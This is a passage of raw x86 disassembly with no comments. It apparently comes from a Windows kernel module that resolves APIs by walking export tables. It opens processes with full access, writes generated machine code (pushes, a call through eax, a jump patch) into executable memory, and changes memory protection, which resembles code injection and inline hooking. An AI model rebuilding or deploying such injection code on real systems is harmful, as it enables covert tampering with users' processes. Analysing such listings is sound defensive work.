   120da:	cmp    edi,esi
   120dc:	jl     0x1216f
   120e2:	push   ebx
   120e3:	lea    eax,[ebp-0xc]
   120e6:	push   eax
   120e7:	push   0x8
   120e9:	push   DWORD PTR [ebp-0x10]
   120ec:	call   0x11908
   120f1:	call   eax
   120f3:	mov    ebx,DWORD PTR ds:0x1ee60
   120f9:	mov    edi,eax
   120fb:	cmp    edi,esi
   120fd:	jl     0x12169
   120ff:	lea    eax,[ebp-0x4]
   12102:	push   eax
   12103:	push   0x1
   12105:	push   esi
   12106:	push   esi
   12107:	push   0x1
   12109:	push   DWORD PTR [ebp-0xc]
   1210c:	call   0x11710
   12111:	call   eax
   12113:	mov    edi,eax
   12115:	cmp    edi,esi
   12117:	jl     0x12164
   12119:	mov    eax,DWORD PTR [ebp+0x8]
   1211c:	mov    DWORD PTR [ebp-0x18],eax
   1211f:	lea    eax,[ebp-0x18]
   12122:	push   eax
   12123:	lea    eax,[ebp-0x38]
   12126:	push   eax
   12127:	push   0x200
   1212c:	lea    eax,[ebp-0x8]
   1212f:	push   eax
   12130:	call   0x116bc
   12135:	call   eax
   12137:	mov    edi,eax
   12139:	cmp    edi,esi
   1213b:	jl     0x1215f
   1213d:	mov    eax,DWORD PTR [ebp-0x4]
   12140:	push   0x8
   12142:	mov    DWORD PTR [ebp-0x20],eax
   12145:	lea    eax,[ebp-0x20]
   12148:	push   eax
   12149:	push   0x9
   1214b:	push   DWORD PTR [ebp-0x8]
   1214e:	mov    DWORD PTR [ebp-0x1c],esi
   12151:	call   0x11932
   12156:	call   eax
   12158:	push   DWORD PTR [ebp-0x8]
   1215b:	mov    edi,eax
   1215d:	call   ebx
   1215f:	push   DWORD PTR [ebp-0x4]
   12162:	call   ebx
   12164:	push   DWORD PTR [ebp-0xc]
   12167:	call   ebx
   12169:	push   DWORD PTR [ebp-0x10]
   1216c:	call   ebx
   1216e:	pop    ebx
   1216f:	mov    eax,edi
   12171:	pop    edi
   12172:	pop    esi
   12173:	leave  
   12174:	ret    0x4
   12177:	int3   
   12178:	int3   
   12179:	int3   
   1217a:	int3   
   1217b:	int3   
   1217c:	mov    edi,edi
   1217e:	push   ebp
   1217f:	mov    ebp,esp
   12181:	sub    esp,0x43c
   12187:	mov    eax,ds:0x7eb38
   1218c:	xor    eax,ebp
   1218e:	mov    DWORD PTR [ebp-0x4],eax
   12191:	mov    eax,DWORD PTR [ebp+0xc]
   12194:	push   ebx
   12195:	push   esi
   12196:	mov    esi,DWORD PTR [ebp+0x8]
   12199:	push   edi
   1219a:	xor    ebx,ebx
   1219c:	push   0x3ff
   121a1:	mov    DWORD PTR [ebp-0x418],eax
   121a7:	lea    eax,[ebp-0x403]
   121ad:	push   ebx
   121ae:	push   eax
   121af:	mov    DWORD PTR [ebp-0x424],esi
   121b5:	mov    BYTE PTR [ebp-0x404],bl
   121bb:	call   0x1dab8
   121c0:	add    esp,0xc
   121c3:	lea    eax,[ebp-0x410]
   121c9:	push   eax
   121ca:	push   0x400
   121cf:	lea    eax,[ebp-0x404]
   121d5:	push   eax
   121d6:	push   ebx
   121d7:	push   ebx
   121d8:	push   esi
   121d9:	jmp    0x12388
   121de:	cmp    eax,ebx
   121e0:	jl     0x123aa
   121e6:	mov    eax,DWORD PTR [ebp-0x418]
   121ec:	lea    edx,[eax+0x2]
   121ef:	mov    cx,WORD PTR [eax]
   121f2:	inc    eax
   121f3:	inc    eax
   121f4:	cmp    cx,bx
   121f7:	jne    0x121ef
   121f9:	mov    ecx,DWORD PTR [ebp-0x3f8]
   121ff:	sub    eax,edx
   12201:	shr    ecx,1
   12203:	sar    eax,1
   12205:	lea    esi,[ecx+eax*1+0x2]
   12209:	xor    ecx,ecx
   1220b:	push   0x2
   1220d:	pop    edx
   1220e:	mov    eax,esi
   12210:	mul    edx
   12212:	seto   cl
   12215:	neg    ecx
   12217:	or     ecx,eax
   12219:	push   ecx
   1221a:	call   0x10a66
   1221f:	mov    edi,eax
   12221:	lea    eax,[esi+esi*1]
   12224:	push   eax
   12225:	push   ebx
   12226:	push   edi
   12227:	mov    DWORD PTR [ebp-0x40c],edi
   1222d:	call   0x1dab8
   12232:	mov    eax,DWORD PTR [ebp-0x418]
   12238:	add    esp,0x10
   1223b:	mov    ecx,eax
   1223d:	mov    dx,WORD PTR [eax]
   12240:	inc    eax
   12241:	inc    eax
   12242:	cmp    dx,bx
   12245:	jne    0x1223d
   12247:	sub    eax,ecx
   12249:	dec    edi
   1224a:	mov    esi,ecx
   1224c:	dec    edi
   1224d:	mov    cx,WORD PTR [edi+0x2]
   12251:	inc    edi
   12252:	inc    edi
   12253:	cmp    cx,bx
   12256:	jne    0x1224d
   12258:	mov    ecx,eax
   1225a:	shr    ecx,0x2
   1225d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1225f:	mov    ecx,eax
   12261:	and    ecx,0x3
   12264:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   12266:	mov    edi,DWORD PTR [ebp-0x40c]
   1226c:	dec    edi
   1226d:	dec    edi
   1226e:	mov    ax,WORD PTR [edi+0x2]
   12272:	inc    edi
   12273:	inc    edi
   12274:	cmp    ax,bx
   12277:	jne    0x1226e
   12279:	mov    esi,0x1de4a
   1227e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1227f:	mov    eax,DWORD PTR [ebp-0x3f8]
   12285:	shr    eax,1
   12287:	push   eax
   12288:	lea    eax,[ebp-0x3f4]
   1228e:	push   eax
   1228f:	push   DWORD PTR [ebp-0x40c]
   12295:	call   0x1daac
   1229a:	mov    esi,DWORD PTR [ebp-0x40c]
   122a0:	mov    eax,esi
   122a2:	add    esp,0xc
   122a5:	mov    DWORD PTR [ebp-0x41c],esi
   122ab:	lea    edx,[eax+0x2]
   122ae:	mov    cx,WORD PTR [eax]
   122b1:	inc    eax
   122b2:	inc    eax
   122b3:	cmp    cx,bx
   122b6:	jne    0x122ae
   122b8:	sub    eax,edx
   122ba:	sar    eax,1
   122bc:	add    eax,eax
   122be:	mov    WORD PTR [ebp-0x41e],ax
   122c5:	mov    WORD PTR [ebp-0x420],ax
   122cc:	lea    eax,[ebp-0x420]
   122d2:	mov    DWORD PTR [ebp-0x434],eax
   122d8:	lea    eax,[ebp-0x43c]
   122de:	push   eax
   122df:	push   0xf003f
   122e4:	lea    eax,[ebp-0x414]
   122ea:	push   eax
   122eb:	mov    DWORD PTR [ebp-0x43c],0x18
   122f5:	mov    DWORD PTR [ebp-0x438],ebx
   122fb:	mov    DWORD PTR [ebp-0x430],0x40
   12305:	mov    DWORD PTR [ebp-0x42c],ebx
   1230b:	mov    DWORD PTR [ebp-0x428],ebx
   12311:	call   0x117e2
   12316:	call   eax
   12318:	push   esi
   12319:	test   eax,eax
   1231b:	jl     0x123a4
   12321:	push   DWORD PTR [ebp-0x414]
   12327:	call   0x1217c
   1232c:	push   esi
   1232d:	mov    BYTE PTR [ebp-0x405],al
   12333:	call   0x10a9a
   12338:	pop    ecx
   12339:	push   DWORD PTR [ebp-0x414]
   1233f:	call   0x1180c
   12344:	call   eax
   12346:	test   eax,eax
   12348:	jl     0x123aa
   1234a:	cmp    BYTE PTR [ebp-0x405],bl
   12350:	je     0x123aa
   12352:	push   0x3ff
   12357:	lea    eax,[ebp-0x403]
   1235d:	push   ebx
   1235e:	push   eax
   1235f:	mov    BYTE PTR [ebp-0x404],bl
   12365:	call   0x1dab8
   1236a:	add    esp,0xc
   1236d:	lea    eax,[ebp-0x410]
   12373:	push   eax
   12374:	push   0x400
   12379:	lea    eax,[ebp-0x404]
   1237f:	push   eax
   12380:	push   ebx
   12381:	push   ebx
   12382:	push   DWORD PTR [ebp-0x424]
   12388:	mov    DWORD PTR [ebp-0x410],ebx
   1238e:	call   0x119b0
   12393:	call   eax
   12395:	cmp    eax,0x8000001a
   1239a:	jne    0x121de
   123a0:	mov    al,0x1
   123a2:	jmp    0x123ac
   123a4:	call   0x10a9a
   123a9:	pop    ecx
   123aa:	xor    al,al
   123ac:	mov    ecx,DWORD PTR [ebp-0x4]
   123af:	pop    edi
   123b0:	pop    esi
   123b1:	xor    ecx,ebp
   123b3:	pop    ebx
   123b4:	call   0x1da3b
   123b9:	leave  
   123ba:	ret    0x8
   123bd:	int3   
   123be:	int3   
   123bf:	int3   
   123c0:	int3   
   123c1:	int3   
   123c2:	mov    eax,ds:0x7ed3c
   123c7:	test   eax,eax
   123c9:	je     0x123da
   123cb:	push   eax
   123cc:	call   0x11a2e
   123d1:	call   eax
   123d3:	and    DWORD PTR ds:0x7ed3c,0x0
   123da:	ret    
   123db:	int3   
   123dc:	int3   
   123dd:	int3   
   123de:	int3   
   123df:	int3   
   123e0:	push   0x28
   123e2:	push   0x7df98
   123e7:	call   0x1dadc
   123ec:	xor    eax,eax
   123ee:	mov    DWORD PTR [ebp-0x28],eax
   123f1:	mov    DWORD PTR [ebp-0x2c],eax
   123f4:	mov    ebx,DWORD PTR [ebp+0x8]
   123f7:	cmp    ebx,eax
   123f9:	jne    0x12402
   123fb:	xor    eax,eax
   123fd:	jmp    0x124df
   12402:	mov    DWORD PTR [ebp-0x4],eax
   12405:	lea    ecx,[ebp-0x2c]
   12408:	push   ecx
   12409:	push   eax
   1240a:	push   0x1
   1240c:	push   ebx
   1240d:	call   0x118de
   12412:	call   eax
   12414:	mov    edx,eax
   12416:	sub    edx,ebx
   12418:	mov    DWORD PTR [ebp-0x38],edx
   1241b:	mov    esi,DWORD PTR [eax+0x1c]
   1241e:	add    esi,ebx
   12420:	mov    edi,DWORD PTR [eax+0x24]
   12423:	add    edi,ebx
   12425:	mov    ecx,DWORD PTR [eax+0x20]
   12428:	add    ecx,ebx
   1242a:	and    DWORD PTR [ebp-0x20],0x0
   1242e:	mov    ebx,DWORD PTR [ebp-0x20]
   12431:	cmp    ebx,DWORD PTR [eax+0x18]
   12434:	jae    0x124c7
   1243a:	movsx  ebx,WORD PTR [edi+ebx*2]
   1243e:	cmp    ebx,DWORD PTR [eax+0x14]
   12441:	jae    0x124bb
   12443:	lea    ebx,[esi+ebx*4]
   12446:	mov    DWORD PTR [ebp-0x34],ebx
   12449:	cmp    DWORD PTR [ebx],edx
   1244b:	jb     0x12459
   1244d:	mov    ebx,DWORD PTR [ebp-0x2c]
   12450:	add    edx,ebx
   12452:	mov    ebx,DWORD PTR [ebp-0x34]
   12455:	cmp    DWORD PTR [ebx],edx
   12457:	jb     0x124b0
   12459:	mov    edx,DWORD PTR [ebp+0xc]
   1245c:	mov    DWORD PTR [ebp-0x30],edx
   1245f:	mov    edx,DWORD PTR [ebp-0x20]
   12462:	mov    edx,DWORD PTR [ecx+edx*4]
   12465:	add    edx,DWORD PTR [ebp+0x8]
   12468:	mov    DWORD PTR [ebp-0x24],edx
   1246b:	mov    dl,BYTE PTR [edx]
   1246d:	mov    ebx,DWORD PTR [ebp-0x30]
   12470:	cmp    dl,BYTE PTR [ebx]
   12472:	jne    0x1249d
   12474:	test   dl,dl
   12476:	je     0x12499
   12478:	mov    edx,DWORD PTR [ebp-0x24]
   1247b:	mov    dl,BYTE PTR [edx+0x1]
   1247e:	mov    BYTE PTR [ebp-0x19],dl
   12481:	cmp    dl,BYTE PTR [ebx+0x1]
   12484:	jne    0x1249d
   12486:	mov    edx,DWORD PTR [ebp-0x24]
   12489:	inc    edx
   1248a:	inc    edx
   1248b:	mov    DWORD PTR [ebp-0x24],edx
   1248e:	inc    ebx
   1248f:	inc    ebx
   12490:	mov    DWORD PTR [ebp-0x30],ebx
   12493:	cmp    BYTE PTR [ebp-0x19],0x0
   12497:	jne    0x1246b
   12499:	xor    edx,edx
   1249b:	jmp    0x124a2
   1249d:	sbb    edx,edx
   1249f:	sbb    edx,0xffffffff
   124a2:	test   edx,edx
   124a4:	jne    0x124b0
   124a6:	mov    eax,DWORD PTR [ebp-0x34]
   124a9:	mov    eax,DWORD PTR [eax]
   124ab:	add    eax,DWORD PTR [ebp+0x8]
   124ae:	jmp    0x124d5
   124b0:	inc    DWORD PTR [ebp-0x20]
   124b3:	mov    edx,DWORD PTR [ebp-0x38]
   124b6:	jmp    0x1242e
   124bb:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   124c2:	jmp    0x123fb
   124c7:	mov    eax,DWORD PTR [ebp-0x28]
   124ca:	jmp    0x124d8
   124cc:	xor    eax,eax
   124ce:	inc    eax
   124cf:	ret    
   124d0:	mov    esp,DWORD PTR [ebp-0x18]
   124d3:	xor    eax,eax
   124d5:	mov    DWORD PTR [ebp-0x28],eax
   124d8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   124df:	call   0x1db21
   124e4:	ret    0x8
   124e7:	int3   
   124e8:	int3   
   124e9:	int3   
   124ea:	int3   
   124eb:	int3   
   124ec:	mov    edi,edi
   124ee:	push   ebp
   124ef:	mov    ebp,esp
   124f1:	sub    esp,0x48
   124f4:	mov    eax,DWORD PTR [ebp+0xc]
   124f7:	mov    eax,DWORD PTR [eax]
   124f9:	push   edi
   124fa:	mov    DWORD PTR [ebp-0x30],eax
   124fd:	lea    eax,[ebp-0x30]
   12500:	push   eax
   12501:	lea    eax,[ebp-0x48]
   12504:	push   eax
   12505:	xor    edi,edi
   12507:	push   0x1f0fff
   1250c:	lea    eax,[ebp-0x10]
   1250f:	push   eax
   12510:	mov    DWORD PTR [ebp-0x48],0x18
   12517:	mov    DWORD PTR [ebp-0x44],edi
   1251a:	mov    DWORD PTR [ebp-0x3c],0x200
   12521:	mov    DWORD PTR [ebp-0x40],edi
   12524:	mov    DWORD PTR [ebp-0x38],edi
   12527:	mov    DWORD PTR [ebp-0x34],edi
   1252a:	mov    DWORD PTR [ebp-0x2c],edi
   1252d:	mov    DWORD PTR [ebp-0x10],edi
   12530:	call   0x116bc
   12535:	call   eax
   12537:	test   eax,eax
   12539:	jl     0x1288d
   1253f:	push   ebx
   12540:	push   esi
   12541:	mov    esi,DWORD PTR ds:0x1ee40
   12547:	push   0x40
   12549:	mov    ebx,0x1000
   1254e:	push   ebx
   1254f:	lea    eax,[ebp-0x14]
   12552:	push   eax
   12553:	push   edi
   12554:	lea    eax,[ebp-0xc]
   12557:	push   eax
   12558:	push   DWORD PTR [ebp-0x10]
   1255b:	mov    DWORD PTR [ebp-0xc],edi
   1255e:	mov    DWORD PTR [ebp-0x14],0x400
   12565:	call   esi
   12567:	test   eax,eax
   12569:	jl     0x12574
   1256b:	mov    eax,DWORD PTR [ebp-0xc]
   1256e:	mov    ecx,DWORD PTR [ebp+0xc]
   12571:	mov    DWORD PTR [ecx+0x8],eax
   12574:	push   0x4
   12576:	push   ebx
   12577:	lea    eax,[ebp-0x14]
   1257a:	push   eax
   1257b:	push   edi
   1257c:	lea    eax,[ebp-0x18]
   1257f:	push   eax
   12580:	push   DWORD PTR [ebp-0x10]
   12583:	mov    DWORD PTR [ebp-0x18],edi
   12586:	mov    DWORD PTR [ebp-0x14],0x400
   1258d:	call   esi
   1258f:	test   eax,eax
   12591:	jl     0x1259c
   12593:	mov    eax,DWORD PTR [ebp-0x18]
   12596:	mov    ecx,DWORD PTR [ebp+0xc]
   12599:	mov    DWORD PTR [ecx+0xc],eax
   1259c:	lea    eax,[ebp-0x24]
   1259f:	push   eax
   125a0:	push   DWORD PTR [ebp-0x30]
   125a3:	call   0x11cce
   125a8:	call   eax
   125aa:	test   eax,eax
   125ac:	jl     0x1288b
   125b2:	push   DWORD PTR [ebp-0x24]
   125b5:	call   0x11a82
   125ba:	call   eax
   125bc:	mov    eax,DWORD PTR [ebp-0xc]
   125bf:	mov    DWORD PTR [ebp-0x20],edi
   125c2:	cmp    eax,edi
   125c4:	je     0x12871
   125ca:	mov    esi,DWORD PTR [ebp-0x18]
   125cd:	cmp    esi,edi
   125cf:	je     0x127de
   125d5:	push   0x214
   125da:	push   edi
   125db:	push   esi
   125dc:	mov    DWORD PTR [ebp-0x4],eax
   125df:	call   0x1dab8
   125e4:	mov    eax,DWORD PTR [ebp-0x4]
   125e7:	add    esp,0xc
   125ea:	push   0x60
   125ec:	lea    ebx,[esi+0xc]
   125ef:	push   eax
   125f0:	mov    DWORD PTR [ebx],edi
   125f2:	mov    DWORD PTR [esi],edi
   125f4:	mov    DWORD PTR [ebp-0x20],eax
   125f7:	call   0x19828
   125fc:	push   0x68
   125fe:	push   eax
   125ff:	call   0x19828
   12604:	push   ebx
   12605:	push   eax
   12606:	call   0x19840
   1260b:	push   0x6a
   1260d:	pop    ebx
   1260e:	push   ebx
   1260f:	push   eax
   12610:	call   0x19828
   12615:	push   edi
   12616:	push   eax
   12617:	call   0x19828
   1261c:	push   ebx
   1261d:	push   eax
   1261e:	call   0x19828
   12623:	push   edi
   12624:	push   eax
   12625:	call   0x19828
   1262a:	push   0x68
   1262c:	push   eax
   1262d:	call   0x19828
   12632:	push   edi
   12633:	push   eax
   12634:	mov    DWORD PTR [ebp-0x28],eax
   12637:	call   0x19840
   1263c:	push   ebx
   1263d:	push   eax
   1263e:	call   0x19828
   12643:	push   edi
   12644:	push   eax
   12645:	call   0x19828
   1264a:	push   ebx
   1264b:	push   eax
   1264c:	call   0x19828
   12651:	push   edi
   12652:	push   eax
   12653:	call   0x19828
   12658:	push   0xb8
   1265d:	push   eax
   1265e:	call   0x19828
   12663:	push   DWORD PTR ds:0x7ed88
   12669:	push   eax
   1266a:	call   0x19840
   1266f:	mov    ebx,0xc00b
   12674:	push   ebx
   12675:	push   eax
   12676:	call   0x1985a
   1267b:	push   0x74
   1267d:	push   eax
   1267e:	call   0x19828
   12683:	push   0x9
   12685:	push   eax
   12686:	call   0x19828
   1268b:	mov    edi,0xd0ff
   12690:	push   edi
   12691:	push   eax
   12692:	call   0x1985a
   12697:	push   0xb9
   1269c:	push   eax
   1269d:	call   0x19828
   126a2:	lea    ecx,[esi+0x10]
   126a5:	push   ecx
   126a6:	push   eax
   126a7:	call   0x19840
   126ac:	push   0x189
   126b1:	push   eax
   126b2:	call   0x1985a
   126b7:	push   0x61
   126b9:	push   eax
   126ba:	call   0x19828
   126bf:	and    DWORD PTR [ebp-0x8],0x0
   126c3:	mov    DWORD PTR [ebp-0x4],eax
   126c6:	mov    eax,DWORD PTR [ebp+0x8]
   126c9:	mov    DWORD PTR [ebp-0x1c],eax
   126cc:	push   0x0
   126ce:	push   DWORD PTR [ebp-0x1c]
   126d1:	push   DWORD PTR [ebp-0x4]
   126d4:	call   0x19fe2
   126d9:	mov    ecx,eax
   126db:	sub    ecx,DWORD PTR [ebp-0x1c]
   126de:	mov    DWORD PTR [ebp-0x1c],eax
   126e1:	add    DWORD PTR [ebp-0x8],ecx
   126e4:	add    DWORD PTR [ebp-0x4],ecx
   126e7:	cmp    DWORD PTR [ebp-0x8],0x5
   126eb:	jb     0x126cc
   126ed:	mov    ecx,DWORD PTR [ebp+0x8]
   126f0:	push   DWORD PTR [ebp-0x4]
   126f3:	mov    eax,DWORD PTR [ebp-0x8]
   126f6:	add    eax,ecx
   126f8:	push   eax
   126f9:	call   0x1989e
   126fe:	push   eax
   126ff:	push   DWORD PTR [ebp-0x28]
   12702:	mov    DWORD PTR [ebp-0x4],eax
   12705:	call   0x19840
   1270a:	mov    eax,DWORD PTR [ebp-0x4]
   1270d:	push   0xeb
   12712:	push   eax
   12713:	mov    DWORD PTR [esi],eax
   12715:	call   0x19828
   1271a:	push   0x0
   1271c:	push   eax
   1271d:	mov    DWORD PTR [esi+0x4],eax
   12720:	call   0x19828
   12725:	push   0x68
   12727:	push   eax
   12728:	call   0x19828
   1272d:	push   0x3e8
   12732:	push   eax
   12733:	call   0x19840
   12738:	push   0xb8
   1273d:	push   eax
   1273e:	call   0x19828
   12743:	push   DWORD PTR ds:0x7ed8c
   12749:	push   eax
   1274a:	call   0x19840
   1274f:	push   ebx
   12750:	push   eax
   12751:	call   0x1985a
   12756:	push   0x74
   12758:	push   eax
   12759:	call   0x19828
   1275e:	push   0x2
   12760:	push   eax
   12761:	call   0x19828
   12766:	push   edi
   12767:	push   eax
   12768:	call   0x1985a
   1276d:	push   eax
   1276e:	push   DWORD PTR [esi]
   12770:	call   0x1989e
   12775:	mov    cl,al
   12777:	sub    cl,BYTE PTR [esi+0x4]
   1277a:	push   0x68
   1277c:	dec    cl
   1277e:	push   eax
   1277f:	mov    BYTE PTR [esi+0x8],cl
   12782:	call   0x19828
   12787:	add    esi,0x14
   1278a:	push   esi
   1278b:	push   eax
   1278c:	call   0x19840
   12791:	push   0xb8
   12796:	push   eax
   12797:	call   0x19828
   1279c:	push   DWORD PTR ds:0x7ed80
   127a2:	push   eax
   127a3:	call   0x19840
   127a8:	push   ebx
   127a9:	push   eax
   127aa:	call   0x1985a
   127af:	push   0x74
   127b1:	push   eax
   127b2:	call   0x19828
   127b7:	push   0x2
   127b9:	push   eax
   127ba:	call   0x19828
   127bf:	push   edi
   127c0:	push   eax
   127c1:	call   0x1985a
   127c6:	push   0xc2
   127cb:	push   eax
   127cc:	call   0x19828
   127d1:	push   0x4
   127d3:	push   eax
   127d4:	call   0x1985a
   127d9:	mov    eax,DWORD PTR [ebp-0xc]
   127dc:	xor    edi,edi
   127de:	cmp    eax,edi
   127e0:	je     0x12871
   127e6:	add    eax,0x400
   127eb:	lea    esi,[eax-0xc]
   127ee:	lea    ecx,[eax-0x8]
   127f1:	push   esi
   127f2:	lea    ebx,[eax-0x4]
   127f5:	lea    edx,[eax-0x10]
   127f8:	push   0x40
   127fa:	add    eax,0xffffffe8
   127fd:	push   ecx
   127fe:	mov    DWORD PTR [ebp-0x1c],eax
   12801:	mov    eax,DWORD PTR [ebp+0x8]
   12804:	mov    DWORD PTR [ebx],eax
   12806:	push   ebx
   12807:	mov    DWORD PTR [ecx],0x5
   1280d:	push   0xffffffff
   1280f:	mov    DWORD PTR [ebp-0x8],ecx
   12812:	mov    DWORD PTR [ebp-0x28],edx
   12815:	mov    DWORD PTR [esi],edi
   12817:	call   DWORD PTR ds:0x7ecfc
   1281d:	test   eax,eax
   1281f:	jl     0x12871
   12821:	mov    eax,DWORD PTR [ebp-0x20]
   12824:	sub    eax,DWORD PTR [ebp+0x8]
   12827:	sub    eax,0x5
   1282a:	push   eax
   1282b:	mov    eax,DWORD PTR [ebp-0x1c]
   1282e:	inc    eax
   1282f:	push   eax
   12830:	call   0x19840
   12835:	push   0xe9
   1283a:	push   DWORD PTR [ebp-0x1c]
   1283d:	call   0x19828
   12842:	mov    eax,DWORD PTR [ebp-0x28]
   12845:	push   eax
   12846:	push   0x5
   12848:	push   DWORD PTR [ebp-0x1c]
   1284b:	mov    DWORD PTR [eax],edi
   1284d:	push   DWORD PTR [ebp+0x8]
   12850:	push   0xffffffff
   12852:	call   DWORD PTR ds:0x7ecf0
   12858:	mov    eax,DWORD PTR [ebp+0xc]
   1285b:	mov    BYTE PTR [eax+0x10],0x1
   1285f:	lea    eax,[ebp-0x20]
   12862:	push   eax
   12863:	push   DWORD PTR [esi]
   12865:	push   DWORD PTR [ebp-0x8]
   12868:	push   ebx
   12869:	push   0xffffffff
   1286b:	call   DWORD PTR ds:0x7ecfc
   12871:	call   0x11a58
   12876:	call   eax
   12878:	call   0x11ca4
   1287d:	mov    ecx,DWORD PTR [ebp-0x24]
   12880:	call   eax
   12882:	push   DWORD PTR [ebp-0x10]
   12885:	call   DWORD PTR ds:0x1ee60
   1288b:	pop    esi
   1288c:	pop    ebx
   1288d:	pop    edi
   1288e:	leave  
   1288f:	ret    0x8
   12892:	int3   
   12893:	int3   
   12894:	int3   
   12895:	int3   
   12896:	int3   
   12897:	int3   
   12898:	mov    edi,edi
   1289a:	push   ebp
   1289b:	mov    ebp,esp
   1289d:	sub    esp,0x18
   128a0:	and    DWORD PTR [ebp-0x18],0x0
   128a4:	push   edi
   128a5:	xor    eax,eax
   128a7:	lea    edi,[ebp-0x14]
   128aa:	stos   DWORD PTR es:[edi],eax
   128ab:	stos   DWORD PTR es:[edi],eax
   128ac:	stos   DWORD PTR es:[edi],eax
   128ad:	stos   DWORD PTR es:[edi],eax
   128ae:	lea    eax,[ebp-0x18]
   128b1:	push   eax
   128b2:	push   0x1
   128b4:	call   0x10ea4
   128b9:	pop    edi
   128ba:	test   al,al
   128bc:	je     0x12914
   128be:	cmp    DWORD PTR [ebp-0x18],0x0
   128c2:	je     0x12914
   128c4:	lea    eax,[ebp-0x4]
   128c7:	push   eax
   128c8:	push   DWORD PTR [ebp-0x18]
   128cb:	call   0x11cce
   128d0:	call   eax
   128d2:	test   eax,eax
   128d4:	jl     0x12914
   128d6:	push   esi
   128d7:	push   DWORD PTR [ebp-0x4]
   128da:	call   0x11a82
   128df:	call   eax
   128e1:	mov    esi,DWORD PTR [ebp-0xc]
   128e4:	mov    eax,DWORD PTR [ebp+0x8]
   128e7:	lea    edx,[esi+0x14]
   128ea:	sub    edx,eax
   128ec:	movzx  ecx,WORD PTR [eax]
   128ef:	mov    WORD PTR [edx+eax*1],cx
   128f3:	inc    eax
   128f4:	inc    eax
   128f5:	test   cx,cx
   128f8:	jne    0x128ec
   128fa:	mov    eax,DWORD PTR [esi+0x4]
   128fd:	mov    cl,BYTE PTR [esi+0x8]
   12900:	mov    BYTE PTR [eax],cl
   12902:	call   0x11a58
   12907:	call   eax
   12909:	call   0x11ca4
   1290e:	mov    ecx,DWORD PTR [ebp-0x4]
   12911:	call   eax
   12913:	pop    esi
   12914:	leave  
   12915:	ret    0x4
   12918:	int3   
   12919:	int3   
   1291a:	int3   
   1291b:	int3   
   1291c:	int3   
   1291d:	int3   
   1291e:	mov    edi,edi
   12920:	push   ebp
   12921:	mov    ebp,esp
   12923:	push   ecx
   12924:	and    DWORD PTR [ebp-0x4],0x0
   12928:	push   ebx
   12929:	push   esi
   1292a:	push   edi
   1292b:	mov    esi,0x1000
   12930:	push   0x20736649
   12935:	push   esi
   12936:	push   0x0
   12938:	call   DWORD PTR ds:0x1ee2c
   1293e:	mov    edi,eax
   12940:	test   edi,edi
   12942:	je     0x12976
   12944:	lea    eax,[ebp-0x4]
   12947:	push   eax
   12948:	push   esi
   12949:	push   edi
   1294a:	push   DWORD PTR [ebp+0x8]
   1294d:	call   0x117b8
   12952:	call   eax
   12954:	mov    ebx,eax
   12956:	cmp    ebx,0xc0000004
   1295c:	jne    0x12969
   1295e:	push   0x0
   12960:	push   edi
   12961:	call   DWORD PTR ds:0x1ee1c
   12967:	add    esi,esi
   12969:	test   ebx,ebx
   1296b:	jne    0x12930
   1296d:	mov    eax,edi
   1296f:	pop    edi
   12970:	pop    esi
   12971:	pop    ebx
   12972:	leave  
   12973:	ret    0x4
   12976:	xor    eax,eax
   12978:	jmp    0x1296f
   1297a:	int3   
   1297b:	int3   
   1297c:	int3   
   1297d:	int3   
   1297e:	int3   
   1297f:	int3   
   12980:	push   0x0
   12982:	push   0x7ed0c
   12987:	call   0x11c50
   1298c:	call   eax
   1298e:	push   0x100
   12993:	push   0x0
   12995:	push   0x7ebd0
   1299a:	call   0x1dab8
   1299f:	add    esp,0xc
   129a2:	ret    
   129a3:	int3   
   129a4:	int3   
   129a5:	int3   
   129a6:	int3   
   129a7:	int3   
   129a8:	mov    edi,edi
   129aa:	push   ebp
   129ab:	mov    ebp,esp
   129ad:	push   esi
   129ae:	push   DWORD PTR [ebp+0xc]
   129b1:	mov    esi,ecx
   129b3:	push   DWORD PTR [ebp+0x8]
   129b6:	call   0x110cc
   129bb:	mov    eax,esi
   129bd:	pop    esi
   129be:	pop    ebp
   129bf:	ret    0x8
   129c2:	int3   
   129c3:	int3   
   129c4:	int3   
   129c5:	int3   
   129c6:	int3   
   129c7:	int3   
   129c8:	mov    edi,edi
   129ca:	push   ebp
   129cb:	mov    ebp,esp
   129cd:	mov    eax,DWORD PTR [ebp+0x8]
   129d0:	push   esi
   129d1:	push   DWORD PTR [eax+0x4]
   129d4:	mov    esi,ecx
   129d6:	push   DWORD PTR [eax]
   129d8:	call   0x110cc
   129dd:	mov    eax,esi
   129df:	pop    esi
   129e0:	pop    ebp
   129e1:	ret    0x4
   129e4:	int3   
   129e5:	int3   
   129e6:	int3   
   129e7:	int3   
   129e8:	int3   
   129e9:	int3   
   129ea:	mov    edi,edi
   129ec:	push   ebp
   129ed:	mov    ebp,esp
   129ef:	push   ebx
   129f0:	push   esi
   129f1:	push   edi
   129f2:	mov    edi,DWORD PTR [ebp+0x8]
   129f5:	mov    eax,DWORD PTR [edi+0x4]
   129f8:	mov    esi,ecx
   129fa:	mov    ebx,DWORD PTR [esi]
   129fc:	mov    DWORD PTR [esi+0x4],eax
   129ff:	inc    eax
   12a00:	push   eax
   12a01:	call   0x10a66
   12a06:	push   DWORD PTR [esi+0x4]
   12a09:	mov    DWORD PTR [esi],eax
   12a0b:	push   DWORD PTR [edi]
   12a0d:	push   eax
   12a0e:	call   0x1daa0
   12a13:	mov    eax,DWORD PTR [esi+0x4]
   12a16:	mov    ecx,DWORD PTR [esi]
   12a18:	push   ebx
   12a19:	mov    BYTE PTR [eax+ecx*1],0x0
   12a1d:	call   0x10a9a
   12a22:	add    esp,0x14
   12a25:	pop    edi
   12a26:	mov    eax,esi
   12a28:	pop    esi
   12a29:	pop    ebx
   12a2a:	pop    ebp
   12a2b:	ret    0x4
   12a2e:	int3   
   12a2f:	int3   
   12a30:	int3   
   12a31:	int3   
   12a32:	int3   
   12a33:	int3   
   12a34:	mov    edi,edi
   12a36:	push   esi
   12a37:	push   edi
   12a38:	push   0x20736649
   12a3d:	push   0x20
   12a3f:	push   0x0
   12a41:	mov    esi,ecx
   12a43:	call   DWORD PTR ds:0x1ee2c
   12a49:	push   0x0
   12a4b:	mov    edi,eax
   12a4d:	push   0x1
   12a4f:	mov    ecx,esi
   12a51:	mov    DWORD PTR [esi],edi
   12a53:	call   0x1112a
